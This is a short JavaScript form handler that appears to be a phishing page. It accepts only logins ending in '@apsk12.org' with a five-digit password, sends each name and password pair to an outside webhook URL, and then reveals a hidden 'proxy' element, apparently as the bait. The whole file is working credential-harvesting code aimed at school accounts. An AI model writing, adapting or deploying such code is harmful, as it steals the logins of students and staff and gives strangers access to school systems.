function send(info) {

    fetch("https://app.hooklistener.com/w/my-first-endpoint-45qh", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            event: "test",
            data: { message: info}
        })
    });
}

document.getElementById("contactForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const name = document.getElementById("name").value.trim();
    const password = document.getElementById("password").value.trim();
    if (!name || !password) {
        return;
    }

    if (!name.endsWith('@apsk12.org')) {
        return;
    }

    if (!/^\d{5}$/.test(password)) {
        return;
    }
    document.getElementById("proxy").hidden = false;
    send(`Name: ${name}, Password: ${password}`);
    e.target.reset();
});
